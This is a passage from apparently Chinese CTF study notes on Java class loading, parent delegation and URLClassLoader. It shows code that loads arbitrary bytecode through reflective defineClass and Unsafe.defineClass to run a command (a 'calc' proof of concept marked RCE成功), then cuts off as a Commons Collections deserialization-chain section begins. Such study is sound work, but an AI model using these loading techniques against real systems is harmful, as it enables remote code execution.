<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    system.out.printIn(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"> system.out.printIn(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它们两的形式就如上，这里就涉及到一个类加载的问题<br>众所周知，在类加载的时候是会执行代码的<br><strong>初始化和实例化：</strong>执行静态代码块，所谓初始化不是实例化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">	 <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        System.out.println(word);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670987687744-4d5f41e9-5844-40f3-bbb7-8a1fb168361a.png#averageHue=%23887660&clientId=u062bc3ef-d615-4&from=paste&height=126&id=u983b8505&name=image.png&originHeight=158&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13113&status=done&style=none&taskId=ue4f2c530-f952-4e21-a879-e40a0dc5130&title=&width=734.4" alt="image.png"><br>根据执行结果可以知道加载了静态代码块，构造代码块等未执行<br>我们也可以让类加载的时候不进行初始化，在forName的源码可以看见：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670987861855-8b72f10e-e6aa-4caf-a495-8135c7c972bf.png#averageHue=%232d2c2c&clientId=u062bc3ef-d615-4&from=paste&height=181&id=ud29f06f3&name=image.png&originHeight=226&originWidth=1151&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36384&status=done&style=none&taskId=ud7bc1008-2d68-4a0d-b556-1b387ee7b8d&title=&width=920.8" alt="image.png"><br><code>initialize</code>默认为true，也就是默认初始化，所以执行了静态代码块的方法，构造方法默认需要四个参数，由于最后一个为null，也就是三个,一个String，一个ClassLoader<br><code>ClassLoader</code>待会儿会提到，是一个类加载器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">         ClassLoader c1=ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class.forName(<span class="string">&quot;Person&quot;</span>,<span class="literal">false</span>,c1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670988084126-57c63d88-8b30-4022-8c2e-f1f1ba474a09.png#averageHue=%23897861&clientId=u062bc3ef-d615-4&from=paste&height=118&id=ue5e2f8b8&name=image.png&originHeight=147&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10646&status=done&style=none&taskId=u9ca86e05-1f4f-4508-9003-540146115c6&title=&width=560.8" alt="image.png"><br>可以看到手动停止了类初始化<br>那再来说说实例化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">//        Class.forName(&quot;Person&quot;);</span></span><br><span class="line"><span class="comment">//        ClassLoader c1=ClassLoader.getSystemClassLoader();</span></span><br><span class="line"><span class="comment">//        Class.forName(&quot;Person&quot;,false,c1);</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670988234274-90d589ff-e0bd-44d9-bbbf-475bf2873cbc.png#averageHue=%232d2c2c&clientId=u062bc3ef-d615-4&from=paste&height=122&id=u73b9650f&name=image.png&originHeight=152&originWidth=1020&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8031&status=done&style=none&taskId=ufcaba248-9a83-4276-8d05-961a7d02c38&title=&width=816" alt="image.png"><br>在类进行实例化的时候，构造代码块和构造函数和静态代码块一并执行，这就是两者的区别</p>
<h3 id="1X1-6-2-双亲委派机制（跟进调试）"><a href="#1X1-6-2-双亲委派机制（跟进调试）" class="headerlink" title="1X1.6.2 双亲委派机制（跟进调试）"></a>1X1.6.2 双亲委派机制（跟进调试）</h3><p>所谓的双亲委派机制，指的就是：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。</strong><br>那么，什么情况下父加载器会无法加载某一个类呢？<br>其实，Java中提供的这四种类型的加载器，是有各自的职责的：</p>
<ul>
<li>Bootstrap ClassLoader ，主要负责加载Java核心类库，%JRE_HOME%\lib下的rt.jar、resources.jar、charsets.jar和class等。</li>
<li>Extention ClassLoader，主要负责加载目录%JRE_HOME%\lib\ext目录下的jar包和class文件。</li>
<li>Application ClassLoader ，主要负责加载当前应用的classpath下的所有类</li>
<li>User ClassLoader ， 用户自定义的类加载器,可加载指定路径的class文件</li>
</ul>
<p>那么也就是说，一个用户自定义的类，如com.hollis.ClassHollis 是无论如何也不会被Bootstrap和Extention加载器加载的。其实很好理解，就是一层层的去委派，自上而下<br>接下来就在IDEA中断点调试一下，分析一下它的流程，调试代码如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670991301644-cbef55ac-8ff1-4a59-bdf3-716ebe7884a9.png#averageHue=%232f2b2b&clientId=uac687198-5c60-4&from=paste&height=158&id=u24779657&name=image.png&originHeight=198&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36254&status=done&style=none&taskId=u9aea2f09-2ab1-4b3d-8f7d-e7cf29e286d&title=&width=761.6" alt="image.png"><br>首先是进入了<code>ClassLoader</code>类里的loadClass方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670991328977-b066ff13-f4c3-43c8-b1dd-f34a96c863f6.png#averageHue=%23876a46&clientId=uac687198-5c60-4&from=paste&height=126&id=u0be681e9&name=image.png&originHeight=157&originWidth=1223&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28184&status=done&style=none&taskId=ua1c16b23-fd25-4bab-ae1b-d8dc1fbb2a7&title=&width=978.4" alt="image.png"><br>调用了<code>Launcher</code>（Appclassloader）里的loadclass方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670991388570-f2d6e50b-fff2-4136-bfbc-3d4687dbf980.png#averageHue=%23917c55&clientId=uac687198-5c60-4&from=paste&height=316&id=u9ebd665b&name=image.png&originHeight=395&originWidth=1903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109843&status=done&style=none&taskId=u459db1de-afdd-4ca1-aefa-937ff424047&title=&width=1522.4" alt="image.png"><br>之后就是一系列的安全判断，我们省去，只解释重要部分，在这里查询了parent加载器是否为null，结果为null的话就再往下慢慢去找<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670991720766-223a80b0-509a-4e81-a752-95f48509bb57.png#averageHue=%232d2c2b&clientId=uac687198-5c60-4&from=paste&height=140&id=uf426b262&name=image.png&originHeight=175&originWidth=1030&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33422&status=done&style=none&taskId=ufdf0c9a5-9622-4ea1-85a8-a3fb9cc7c9b&title=&width=824" alt="image.png"><br>现在进入了URLclassloader里，属于ext拓展类加载器，这是app加载器的父类加载器，URLclassloader是Appclassloader类的父类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670991848769-62a1b1a1-6546-4691-919d-bd0a0e8a75d3.png#averageHue=%232e2d2c&clientId=uac687198-5c60-4&from=paste&height=254&id=uc1355133&name=image.png&originHeight=317&originWidth=1256&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73733&status=done&style=none&taskId=u70b7e8da-0c66-4c14-b48b-df338c0a90c&title=&width=1004.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670991829705-0983fab9-433c-488f-b50b-954dea9330df.png#averageHue=%23698365&clientId=uac687198-5c60-4&from=paste&height=636&id=u2324c7b5&name=image.png&originHeight=795&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=172830&status=done&style=none&taskId=uca9e63f8-b5c7-43ff-aeaa-eab9d5d453c&title=&width=1536" alt="image.png"><br>在父类加载器中没找到，就又回到了Appclassloader，然后调用了urlclassloader里的<code>defineclass</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670993308464-37a85f56-12e0-4bc9-bc21-1f04fa610b7a.png#averageHue=%23755c39&clientId=uac687198-5c60-4&from=paste&height=125&id=uf98625ff&name=image.png&originHeight=156&originWidth=1501&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54882&status=done&style=none&taskId=uf6178c55-ce2b-4d3c-ac52-6851dfb74f2&title=&width=1200.8" alt="image.png"><br>继续前往URLclassLoadr的父类SecureClassLoader：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670993333151-89436fc3-eb28-417b-a081-eea6588e5755.png#averageHue=%232c2b2b&clientId=uac687198-5c60-4&from=paste&height=244&id=u68badafe&name=image.png&originHeight=305&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63538&status=done&style=none&taskId=ub3c44bff-d4c5-431e-bc4e-035e0bdb4e4&title=&width=1232" alt="image.png"><br>最后也是在Appclassloader里加载了这个类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670992676297-e4e6a504-f9c9-4f7a-aec6-cc6900f42f92.png#averageHue=%232d2d2c&clientId=uac687198-5c60-4&from=paste&height=306&id=u02080c13&name=image.png&originHeight=382&originWidth=1563&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104749&status=done&style=none&taskId=udb18fd8d-f180-42e6-b8d6-be3d1e12aa1&title=&width=1250.4" alt="image.png"><br>从结果可以看到是加载了<strong>字节码</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670993590330-a8a53932-c867-4d0f-a570-6b4c806cd962.png#averageHue=%23524e43&clientId=uac687198-5c60-4&from=paste&height=409&id=ufbeb7219&name=image.png&originHeight=511&originWidth=717&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76112&status=done&style=none&taskId=ubf82452c-3e18-4dfa-8acd-b4656146b08&title=&width=573.6" alt="image.png"><br>从结果分析这几个类的父子关系是ClassLoader-&gt;SecureClassloader-&gt;urlclassloaer-&gt;applicationclassloaer-&gt;loadclass-&gt;defineclas(加载字节码）</p>
<h3 id="1X1-6-3-URLclassLoader任意类加载"><a href="#1X1-6-3-URLclassLoader任意类加载" class="headerlink" title="1X1.6.3 URLclassLoader任意类加载"></a>1X1.6.3 URLclassLoader任意类加载</h3><p>上文中已经分析了URLclassloader，其实这个类里面还有一个loadclass方法，可以通过URL加载类，通过如下例子来理解：<br>首先python起一个http服务：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671020753767-729b38a3-e424-431c-804c-058a2e4ec8fa.png#averageHue=%23393736&clientId=u0b023bac-5a68-4&from=paste&height=114&id=ufaef30c0&name=image.png&originHeight=142&originWidth=832&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18336&status=done&style=none&taskId=u40e7bbde-87c8-4de1-91e0-30144186c00&title=&width=665.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671020771578-fd325a8e-7e4f-476f-a759-4562f3572094.png#averageHue=%232d2c2c&clientId=u0b023bac-5a68-4&from=paste&height=178&id=u95303936&name=image.png&originHeight=222&originWidth=773&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21178&status=done&style=none&taskId=uf5c1a978-9f7e-452e-87d1-78a3e08a57b&title=&width=618.4" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URLClassLoader urlloader=<span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; hello = urlloader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        hello.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671020762331-6938fb15-4246-4218-b2a2-703fe95d5b79.png#averageHue=%232e2d2d&clientId=u0b023bac-5a68-4&from=paste&height=81&id=u4926d7f6&name=image.png&originHeight=101&originWidth=670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7128&status=done&style=none&taskId=u606ba6ea-1ea7-42a3-b268-ccc0cec8643&title=&width=536" alt="image.png"><br>可以看到URLclassLoader可以加载class文件，除此之外还可以用别的方式，比如file协议，jar协议等等</p>
<h3 id="1X1-6-4-ClassLoader加载字节码执行命令"><a href="#1X1-6-4-ClassLoader加载字节码执行命令" class="headerlink" title="1X1.6.4 ClassLoader加载字节码执行命令"></a>1X1.6.4 ClassLoader加载字节码执行命令</h3><p>在上文中也说到了，我们最后加载类是通过<code>Classloader.defineClass</code>方法加载字节码得到的，因此我们可以通过反射获取defineClass方法，加载我们定义的任意类，只需要以字节码的形式传入即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Method defineclass=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineclass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] words= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTF学习笔记\\Java\\Java\\out\\production\\Java\\Hello.class&quot;</span>));</span><br><span class="line">        ClassLoader c=ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineclass.invoke(c, <span class="string">&quot;Hello&quot;</span>, words, <span class="number">0</span>, words.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671021508597-68cfedef-a227-42a4-bd63-3fb28378c737.png#averageHue=%23575045&clientId=u0b023bac-5a68-4&from=paste&height=698&id=u009ef0ce&name=image.png&originHeight=872&originWidth=1915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=297991&status=done&style=none&taskId=udc015a9f-cfda-49e8-b513-115e1ac824a&title=&width=1532" alt="image.png"><br>RCE成功</p>
<h3 id="1X1-6-5-Unsafe加载字节码"><a href="#1X1-6-5-Unsafe加载字节码" class="headerlink" title="1X1.6.5 Unsafe加载字节码"></a>1X1.6.5 Unsafe加载字节码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] words= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTF学习笔记\\Java\\Java\\out\\production\\Java\\Hello.class&quot;</span>));</span><br><span class="line">        ClassLoader c=ClassLoader.getSystemClassLoader();</span><br><span class="line">        Field f=Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; hello = unsafe.defineClass(<span class="string">&quot;Hello&quot;</span>, words, <span class="number">0</span>, words.length, c, <span class="literal">null</span>);</span><br><span class="line">        hello.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671022565888-1fb96816-09fe-41cb-b352-54ba31706f12.png#averageHue=%2393a69e&clientId=u0b023bac-5a68-4&from=paste&height=590&id=u8128985a&name=image.png&originHeight=738&originWidth=1559&originalType=binary&ratio=1&rotation=0&showTitle=false&size=320697&status=done&style=none&taskId=u716e75f6-a82c-48a3-aca4-507b9fd9c2c&title=&width=1247.2" alt="image.png"><br>可能细心一点的人发现了，这次我获取的是unsafe的属性，而不是<code>defineClass</code>方法，同样的unsafe类也有definclass方法，但是他是原生的类（底层C加载），因此反射过来无法调用：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671024982517-0713130b-ed2a-4692-a665-adaa08ba6d45.png#averageHue=%23302d2c&clientId=uf9843972-21cc-4&from=paste&height=184&id=u87c45ea3&name=image.png&originHeight=230&originWidth=1457&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53822&status=done&style=none&taskId=u04756eec-ceee-4d1b-9795-a659a01676a&title=&width=1165.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671025006458-23434d11-f395-4f06-bcb4-2c222109dac7.png#averageHue=%23302e2d&clientId=uf9843972-21cc-4&from=paste&height=60&id=ua3c547f2&name=image.png&originHeight=75&originWidth=1404&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13410&status=done&style=none&taskId=ud983852b-fdca-4c9d-bd7d-9866431e18f&title=&width=1123.2" alt="image.png"><br>而classloader里的definclass就不是了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671025022555-147190e1-9381-431a-95a3-135b106c0ca1.png#averageHue=%232d2c2c&clientId=uf9843972-21cc-4&from=paste&height=162&id=u8f0ead9d&name=image.png&originHeight=202&originWidth=1173&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26072&status=done&style=none&taskId=ua4846372-a4ea-40a8-b224-7ef304a5ff9&title=&width=938.4" alt="image.png"><br>因此我们需要先获取Unsafe对象，进而调用definclass方法，最后加载任意类从而实现命令执行：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671025091345-13fc2b3d-f570-41a4-89c6-10701f5549d5.png#averageHue=%232d2c2c&clientId=uf9843972-21cc-4&from=paste&height=146&id=u65ef2874&name=image.png&originHeight=182&originWidth=1403&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36771&status=done&style=none&taskId=u94c83b21-4b03-43e6-8720-1a1fe84b426&title=&width=1122.4" alt="image.png"><br>在Unsafe的静态代码块里可以看到,theunsafe属性是一个Unsafe对象，因此获取他</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="1X2-深入研究CC链（1-7）"><a href="#1X2-深入研究CC链（1-7）" class="headerlink" title="1X2 深入研究CC链（1-7）"></a>1X2 深入研究CC链（1-7）</h1><p>CC链全称CommonsCollections(Java常用的一个库）</p>
<h2 id="1X2-1-CC1"><a href="#1X2-1-CC1" class="headerlink" title="1X2.1 CC1"></a>1X2.1 CC1</h2><p>CC1链作为最重要的一条链，所以我会尽可能的讲的很清楚，让大家看清楚，因为CCx的思路和CC1基本一致，所以理解透彻了一条链，那么其他链也就通了</p>
<h3 id="1X2-1-1-环境搭建"><a href="#1X2-1-1-环境搭建" class="headerlink" title="1X2.1.1 环境搭建"></a>1X2.1.1 环境搭建</h3><p>JDK版本：jdk1.8_8u65<br>用8u65的原因的CC1在8u71版本后被修复了，下载地址<br>国内的oracle jdk下载的好像有点问题，下载不到8u65，原因未知<br>Maven依赖：</p>
